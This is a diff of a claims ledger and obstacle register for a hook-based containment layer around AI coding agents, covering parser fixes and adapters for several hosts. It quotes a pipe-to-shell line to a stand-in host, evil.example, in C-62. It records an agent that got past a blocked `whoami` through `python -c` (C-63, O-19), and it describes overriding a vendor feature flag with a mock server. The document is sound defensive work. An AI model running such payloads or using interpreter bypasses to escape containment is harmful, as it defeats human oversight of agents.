@@ -108,6 +108,10 @@ Reproduce everything: `python run_proofs.py` (needs `pip install metaspace-membr
 | C-59 | Self-protection covers every known host anchor, structurally | HARD | PROVEN |
 | C-60 | Installing into a second host is merged, backed up and reversible | N/A | PROVEN |
 | C-61 | The proof suite is hermetic — results do not depend on the machine | N/A | PROVEN |
+| C-62 | A comment can never silently empty the shell allowlist; a broken one fails closed | HARD | PROVEN |
+| C-63 | An allowlisted non-shell interpreter can execute uninspected code | N/A | STATED |
+| C-64 | Antigravity's tool-call contract reaches the unmodified Warden, fail-closed | N/A | PROVEN |
+| C-65 | Hard containment on Antigravity, measured on a stock install | HARD | BLOCKED |
 
 ---
 
@@ -562,6 +566,77 @@ That workaround is no longer needed.
 run, shows the baseline neutralising it, and checks the runner actually passes it to children.
 **VERIFIED:** Win (2026-07-21)
 
+### C-62 — A comment can never silently empty the shell allowlist, and an allowlist that cannot be read denies instead of degrading
+`[PROVEN]` · **TIER:** HARD · **STATUS:** PROVEN · **DEPENDS:** C-02 · **Resolves:** O-20
+**CONDITION:** as C-02 — the host routes shell effects through the hook and the verdict is
+authoritative. The guarantee here is about the *policy the hook enforces matching the policy the
+author wrote*; it does not extend the set of effects mediated.
+**How it was found:** while tuning the Antigravity constitution, a comment containing a semicolon
+was written inside an `ALLOW` statement. The parse (`ALLOW\s+([^;]*);` over raw text, duplicated
+in three files per O-2) stopped at that semicolon and produced ZERO programs. An empty allowlist
+is not a strict policy but the absence of one: `core.shell_policy.check` enters the allowlist
+branch only `if allow`, so the allowlist and the O-19 interpreter hardening were skipped
+together, leaving a porous denylist. Nothing was logged. Reproduced against the real hook before
+the fix: `curl http://evil.example/x.sh | bash` returned exit 0 — allowed.
+**Fix:** one parser (`core/bio_policy.py`) replaces the three copies. Comments are stripped
+before matching, and the stripping is quote-aware so a `#` inside a quoted string stays data.
+The allowlist is read from the `BASH_POLICY` block only, because `ALLOW` is also the DEPENDENCIES
+keyword. Independently of the regex, `shell_policy.check(..., allow_declared=True)` denies when a
+constitution states an allowlist that yields no program — so a future parse bug becomes a loud
+refusal, not a silent downgrade.
+**Exposure measured, not assumed:** all 22 constitutions on the development machine — shipped,
+installed and generated — were re-parsed with both expressions. None had been degraded, and no
+ratification fingerprint moved, so no RATIFIED constitution flips to TAMPERED (the O-3 hazard).
+**Asymmetry, deliberate:** the denylist is still read file-wide rather than block-scoped. An
+out-of-block `ALLOW` would grant; an out-of-block `DENY` only refuses.
+**PROOF:** `run_bashparse_proof` (P-BASHPARSE) — six legs against the real hook, including the
+pipe-to-shell command an empty allowlist waves through.
+**VERIFIED:** Win (2026-07-28)
+
+### C-63 — An allowlisted non-shell interpreter can execute code the allowlist never inspects
+`[SCOPE-LIMIT]` · **TIER:** N/A · **STATUS:** STATED
+`core/shell_policy.py` hardens *shell* interpreters (`sh`, `bash`, `zsh`, `dash`, `ksh`, `ash`):
+`bash -c CMD` is re-checked recursively and piped stdin is refused. `python`, `node`, `perl` and
+`ruby` are not in that set, so an allowlisted `python -c "…"` or `node -e "…"` runs code no
+allowlist entry describes. Measured live: an agent blocked from `whoami` read the username with
+`python -c "import os; print(os.environ['USERNAME'])"`. A development agent needs those runtimes,
+so on shell-mediated hosts the containment guarantee rests on the FILESYSTEM write-scope and the
+NETWORK out-scope; the BASH allowlist is defence-in-depth, not the boundary. Stated rather than
+implied, because a reader could otherwise take the allowlist for the guarantee.
+**DOCUMENTED-IN:** `README.md`, `SECURITY.md` · **RELATED:** O-19
+
+### C-64 — Antigravity's tool-call contract reaches the unmodified Warden, and the verdict returns in Antigravity's own vocabulary
+`[PROVEN]` · **TIER:** N/A · **STATUS:** PROVEN · **DEPENDS:** C-38 · **Resolves:** O-16
+This is a claim about the BRIDGE, deliberately not about the host. `agy` speaks a shape no other
+host uses — `{"toolCall": {"name", "args"}, "workspacePaths"}` in, `{"decision":
+"allow"|"deny"|"ask"|"force_ask"}` out — and its enum rejects Claude Code's `approve`, which made
+an early live run produce verdicts agy discarded. `agy_warden_adapter.py` translates both
+directions and invokes the Warden unmodified, so the shell policy (including the recursive
+`bash -c` re-check), the filesystem scope, and the code-injected config-anchor denies of C-59 all
+survive translation without a second decision core existing anywhere.
+**Found by its own proof:** empty stdin used to decode to `{}`, which carries no tool call, which
+the Warden passes through as a non-mediated event — so a broken pipe ALLOWED. The adapter now
+raises on empty input, matching the Warden's own rule that a membrane which cannot see the
+request must not permit it.
+**Honest scope:** the fact that agy *calls* the hook at all is a property of agy, not of this
+adapter, and it is currently gated (O-21). That is C-65, and it is BLOCKED — not folded in here.
+**PROOF:** `run_agy_adapter_proof` (P-AGY) — hermetic: temporary HOME, workspace and
+constitution, no agy binary required.
+**VERIFIED:** Win (2026-07-28)
+
+### C-65 — Hard containment on Antigravity, measured on a stock install
+`[PROVEN]`-shaped but **STATUS:** BLOCKED · **TIER:** HARD · **DEPENDS:** C-64 · **BLOCKED-BY:** O-21
+**CONDITION:** agy routes tool calls through its `jsonhook` path and honours the returned
+`decision` — which requires its `json-hooks-enabled` feature flag to be on for
+`product=antigravity`. It is not, on a stock install.
+**What HAS been measured** (2026-07-22, recorded under O-16): with agy's in-process Unleash
+client redirected to a local mock that strips the `ide=jetski` constraint, agy loads AND executes
+the workspace `.agents/hooks.json`, and the adapter blocked live shell and out-of-scope writes.
+**Why that is not yet a claim:** the measurement required an intervention no user would perform,
+so it does not describe the product anyone can install. Asserting a tier on that basis would be
+exactly the over-statement this ledger exists to prevent. The row stays BLOCKED until the flag
+reaches `product=antigravity` upstream, or agy ships another ingress.
+
 ---
 
 # Obstacle register
@@ -584,14 +659,15 @@ run, shows the baseline neutralising it, and checks the runner actually passes i
 | **O-10** | The BSL Competing-Use scope and its interaction with the patent position await legal review. Non-blocking for the grant. | stated | OPEN | — |
 | **O-18** | **Gemini CLI can no longer authenticate on this account**, so its live run cannot be performed: `IneligibleTierError: This client is no longer supported for Gemini Code Assist for individuals. To continue using Gemini, please migrate to the Antigravity suite of products.` The install side is done and verified (C-60), but no verdict can be measured, so no tier may be claimed. **This inverts the priority:** Gemini CLI is installable-but-unmeasurable, while Antigravity is the live successor product — measurable, but its config path is still unknown (O-16). Resolving O-16 is now the path forward, not a side quest. | **empirical run** | OPEN | C-57 |
 | **O-17** | The proof suite inherited the developer's own membrane configuration: most proofs never set `METASPACE_MODE` and relied on "unset means enforce". Once C-54 made the user-level config authoritative, a real config saying `dryrun` failed four core proofs — evidence that depended on the machine. **Resolved by C-61** (hermetic baseline in `run_proofs.py`). | **empirical run** | RESOLVED | — |
-| **O-16** | **Antigravity CLI (`agy`) — config solved, execution not.** Established by experiment, never by guessing: **path** = `~/.gemini/antigravity-cli/hooks.json` (six candidates seeded with distinct markers; agy's own counter moved `0 → 2 hooks.json file(s)`); **shape** = a flat *name → jsonhook.JSONHookSpec* map, revealed by its unmarshal error, which is what "named hooks" means in its log; **fields** = `type, command, prompt, model, enabled, timeout, tools, events, description, name`, harvested from the binary's struct tags; **validation** = its own validator accepts the reconstructed spec. **Still does not execute.** Eight event-name variants (`preTool`, `PreTool`, `beforeTool`, `BeforeTool`, `PreToolUse`, `pre_tool`, singular `event`, no event field) were installed at once and a real file-writing tool invocation fired none of them — marker dir empty, no execution trace in the log. Note the validator accepted **all eight**, so `loaded N named hooks` cannot be used as a signal for a correct event name. **Leading hypothesis:** hooks may require an active workspace — agy reported *"there is currently no active workspace set"* and wrote to its scratch dir instead; it also ships `trustedWorkspaces`, and Cursor had a comparable trust gate. Testable with `--add-dir` / `--new-project` / a trusted folder. **Update (2026-07-22) — execution SOLVED by experiment; the workspace hypothesis was wrong.** The real gate is a server-side Unleash feature-flag `json-hooks-enabled`, globally enabled but constrained to `ide=jetski`; agy reports `product=antigravity`, so its `customizations.Manager.isFeatureEnabled` returned false and hooks *loaded but never fired*. Redirecting agy's in-process Unleash client to a local mock (`UNLEASH_URL`, constraint stripped) flips it on, and agy then loads AND executes the *workspace* `.agents/hooks.json` via its `jsonhook.go` path (distinct from the global `hooks_manager.go`) under a name→event→matcher→hooks schema read from the binary's embedded help. A thin adapter bridges agy's `toolCall` / `{"decision":…}` contract to the unmodified Warden core, which blocks live shell and out-of-scope writes. STATUS stays OPEN pending a formal claim + proof harness (claim=proof); the config/execution facts above are now established. | **empirical run** | OPEN | an Antigravity claim |
+| **O-16** | **Antigravity CLI (`agy`) — config solved, execution not.** Established by experiment, never by guessing: **path** = `~/.gemini/antigravity-cli/hooks.json` (six candidates seeded with distinct markers; agy's own counter moved `0 → 2 hooks.json file(s)`); **shape** = a flat *name → jsonhook.JSONHookSpec* map, revealed by its unmarshal error, which is what "named hooks" means in its log; **fields** = `type, command, prompt, model, enabled, timeout, tools, events, description, name`, harvested from the binary's struct tags; **validation** = its own validator accepts the reconstructed spec. **Still does not execute.** Eight event-name variants (`preTool`, `PreTool`, `beforeTool`, `BeforeTool`, `PreToolUse`, `pre_tool`, singular `event`, no event field) were installed at once and a real file-writing tool invocation fired none of them — marker dir empty, no execution trace in the log. Note the validator accepted **all eight**, so `loaded N named hooks` cannot be used as a signal for a correct event name. **Leading hypothesis:** hooks may require an active workspace — agy reported *"there is currently no active workspace set"* and wrote to its scratch dir instead; it also ships `trustedWorkspaces`, and Cursor had a comparable trust gate. Testable with `--add-dir` / `--new-project` / a trusted folder. **Update (2026-07-22) — execution SOLVED by experiment; the workspace hypothesis was wrong.** The real gate is a server-side Unleash feature-flag `json-hooks-enabled`, globally enabled but constrained to `ide=jetski`; agy reports `product=antigravity`, so its `customizations.Manager.isFeatureEnabled` returned false and hooks *loaded but never fired*. Redirecting agy's in-process Unleash client to a local mock (`UNLEASH_URL`, constraint stripped) flips it on, and agy then loads AND executes the *workspace* `.agents/hooks.json` via its `jsonhook.go` path (distinct from the global `hooks_manager.go`) under a name→event→matcher→hooks schema read from the binary's embedded help. A thin adapter bridges agy's `toolCall` / `{"decision":…}` contract to the unmodified Warden core, which blocks live shell and out-of-scope writes. **RESOLVED by C-64:** the config and execution facts are established, the bridge is packaged and now carries a hermetic proof (P-AGY) that also caught a fail-open of its own (empty stdin allowed). The one thing that remains unproven — whether a STOCK agy calls the hook at all — is not a property of this project and has been split out as **O-21**, blocking **C-65**. | **empirical run** | RESOLVED | — |
 | **O-15** | The membrane's own state (`project_config`, `license`, `telemetry`) lives under `~/.claude/metaspace` — inside *one host's* config directory. A Gemini-only user gets a stray `~/.claude` tree, and `metaspace off --purge` on the Claude side would delete state other hosts still rely on. Split out of O-1: architectural and a minor purge bug, **not** a security issue, and it blocks no claim. | verified in code | OPEN | — |
 | **O-14** | **Self-protection covers only one anchor.** Every generated constitution denies `{{CLAUDE_HOME}}/**` (`core/bio_fields.py`), which defends the Claude Code config — and, because Cursor reads that same file, Cursor too. **Gemini uses its own anchor** (`~/.gemini/settings.json`). Installing into a new host without extending the deny to that host's anchor gives a deceived agent a fresh route to disable the membrane there: exactly the attack C-33 exists to stop. Also affects any per-project constitution written before a new anchor was known. **Resolved by C-59:** the anchors are injected from code, so constitutions written before a host existed — or hand-edited — are protected too. | verified in code | RESOLVED | — |
 | **O-13** | **Cursor does not propagate the `env` block from `~/.claude/settings.json` to hooks.** Measured: `mode_from_env=false`, `bio_from_env=false`. Two consequences. (a) `METASPACE_MODE=dryrun` never arrives, so the hook runs in its built-in `enforce` default — safe-by-default, but it defeats the observe-first rollout (C-35): a Cursor user gets hard blocking with no warning session. (b) `METASPACE_SESSION_BIO` never arrives either, so the **shipped** constitution is used, not the user's — per-project configuration made in `metaspace ui` is silently ignored under Cursor. **Resolved by C-54** (settings mirrored to a file every host can read). | **empirical run** | RESOLVED | — |
 | **O-11** | **`afterFileEdit` cannot veto a write — confirmed by experiment.** A hook returning `permission: deny` from `afterFileEdit` was ignored: the file was created and persisted (Cursor 3.12.17, 2026-07-21). Consistent with the call site, which awaits the hook result and never inspects it. **Scope narrowed after measurement:** this does *not* prove write containment is impossible on Cursor — `preToolUse` is in the blocking list and receives Claude's `Write`/`Edit`, which is untested. It proves only that the post-edit hooks are observational. | **empirical run** + call site | OPEN | — |
 | **O-12** | Cursor's hook payload is **UTF-8 BOM-prefixed** and uses its own dialect (`hook_event_name` + `command`/`file_path`) even when the hook is registered via `~/.claude/settings.json`, and it takes the verdict from a JSON `permission` on stdout, ignoring Claude Code's exit-code-2 contract. Untreated, the Warden fail-closed on every Cursor tool call. **RESOLVED** by three fixes in `session_guard_hook.py`, proven by `run_cursor_compat_proof` against a captured payload. | empirical run | RESOLVED | — |
-| **O-19** | **An allowlisted non-shell interpreter is a universal exec bypass.** `core/shell_policy.py` hardens shell interpreters (`_SHELL_INTERPRETERS` = sh/bash/zsh/dash/ksh/ash: `bash -c CMD` is re-checked recursively, piped stdin refused), but `python`/`node`/`perl`/`ruby` are NOT in that set, so an allowlisted `python -c "…"` or `node -e "…"` runs code the allowlist never inspects. Measured live: agy, blocked from `whoami`, read the username via `python -c "import os; print(os.environ['USERNAME'])"`. A dev agent needs python/node, so for shell-mediated hosts the containment guarantee rests on the FILESYSTEM write-scope and NETWORK out-scope — not the BASH allowlist, which is defense-in-depth only. Must be stated publicly, not implied. | empirical run + code | OPEN | — |
-| **O-20** | **A semicolon inside a comment in an `ALLOW` block silently empties the allowlist — a fail-OPEN.** The allow/deny parse (triplicated per O-2) uses `ALLOW\s+([^;]*);`, which stops at the first semicolon; a comment like `# runtimes (dev necessity; node too)` truncates the capture to zero programs. An empty allowlist makes `shell_policy.check` skip BOTH the allowlist AND the interpreter hardening of O-19, leaving only the top-level denylist — a silent downgrade from deny-by-default to a porous denylist, emitting no error. Found while tuning the agy constitution. The fix belongs in the parser (strip comments before matching), not in a "no semicolons in comments" convention. | empirical run + code | OPEN | — |
+| **O-19** | **An allowlisted non-shell interpreter is a universal exec bypass.** `core/shell_policy.py` hardens shell interpreters (`_SHELL_INTERPRETERS` = sh/bash/zsh/dash/ksh/ash: `bash -c CMD` is re-checked recursively, piped stdin refused), but `python`/`node`/`perl`/`ruby` are NOT in that set, so an allowlisted `python -c "…"` or `node -e "…"` runs code the allowlist never inspects. Measured live: agy, blocked from `whoami`, read the username via `python -c "import os; print(os.environ['USERNAME'])"`. A dev agent needs python/node, so for shell-mediated hosts the containment guarantee rests on the FILESYSTEM write-scope and NETWORK out-scope — not the BASH allowlist, which is defense-in-depth only. Must be stated publicly, not implied. **Accepted as a limit and published rather than fixed:** removing `python`/`node` from the allowlist would disarm the agent, and adding them to `_SHELL_INTERPRETERS` cannot work — there is no allowlist-shaped question to ask of `python -c "…"`. **Stated as C-63** in the ledger, README and SECURITY.md, so no reader can mistake the allowlist for the boundary. | empirical run + code | ACCEPTED-LIMIT | — |
+| **O-20** | **A semicolon inside a comment in an `ALLOW` block silently empties the allowlist — a fail-OPEN.** The allow/deny parse (triplicated per O-2) uses `ALLOW\s+([^;]*);`, which stops at the first semicolon; a comment like `# runtimes (dev necessity; node too)` truncates the capture to zero programs. An empty allowlist makes `shell_policy.check` skip BOTH the allowlist AND the interpreter hardening of O-19, leaving only the top-level denylist — a silent downgrade from deny-by-default to a porous denylist, emitting no error. Found while tuning the agy constitution. The fix belongs in the parser (strip comments before matching), not in a "no semicolons in comments" convention. **RESOLVED by C-62:** one quote-aware parser (`core/bio_policy.py`) replaces the three copies, scoped to the `BASH_POLICY` block since `ALLOW` is also the DEPENDENCIES keyword; and, independently of the regex, a *declared* allowlist that yields no program now denies (`shell_policy.check(..., allow_declared=True)`), so the whole class fails loudly instead of silently. Exposure measured across all 22 constitutions on the machine: none had been degraded, no ratification fingerprint moved. | empirical run + code | RESOLVED | — |
+| **O-21** | **Antigravity's hook execution is gated by a server-side feature flag, not by anything local.** `agy` loads `.agents/hooks.json` but its `customizations.Manager.isFeatureEnabled` asks an in-process Unleash client about `json-hooks-enabled`, which is globally enabled yet constrained to `ide=jetski`; `agy` reports `product=antigravity`, so hooks load and never fire. Established by measurement, then confirmed by inversion: redirecting that client to a local mock with the constraint stripped makes agy both load and execute the hooks, and the Warden then blocks live shell and out-of-scope writes. **Nothing local can lift this** — it is a vendor rollout decision, not a configuration. Split out of O-16, which is otherwise resolved: the bridge exists and is proven (C-64); what is missing is a stock host that calls it. Watch for the flag reaching `product=antigravity`, or for another ingress in a later release. | **empirical run** (mock inversion) | OPEN | C-65 |
 
 ---
 
